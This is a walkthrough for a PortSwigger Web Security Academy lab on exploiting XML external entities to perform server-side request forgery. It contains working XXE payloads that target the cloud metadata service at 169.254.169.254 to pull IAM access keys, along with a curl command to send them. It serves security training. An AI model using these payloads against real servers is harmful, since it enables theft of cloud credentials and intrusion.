\# Solution â€“ Exploiting XXE to Perform SSRF



\## Lab title

Exploiting XXE to perform SSRF attacks  

(PortSwigger Web Security Academy)



\## Step 1: Intercept and inspect a request



Send this normal XML:

```xml

<stockCheck>

&nbsp; <productId>123</productId>

</stockCheck>

The server responds:

Invalid product ID: 123



==>This confirms that the value is reflected and can be manipulated.

Step 2: Craft XXE payload to target internal metadata server

Replace the XML with this:



<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo \[

&nbsp; <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">

]>

<stockCheck>

&nbsp; <productId>\&xxe;</productId>

</stockCheck>

Step 3: Send the request using Burp



curl https://your-lab-id.web-security-academy.net/product/stock \\

&nbsp; -X POST \\

&nbsp; -H "Content-Type: application/xml" \\

&nbsp; --data-binary @xxe-ssrf-payload.xml

Step 4: Analyze the response

Send another payload to get full credentials:



<!DOCTYPE foo \[

&nbsp; <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role">

]>

<stockCheck>

&nbsp; <productId>\&xxe;</productId>

</stockCheck>

Expected output:



Invalid product ID: {

&nbsp; "AccessKeyId": "...",

&nbsp; "SecretAccessKey": "...",

&nbsp; ...

}



Step 5: Lab is solved

If credentials are returned, the lab marks as solved automatically.











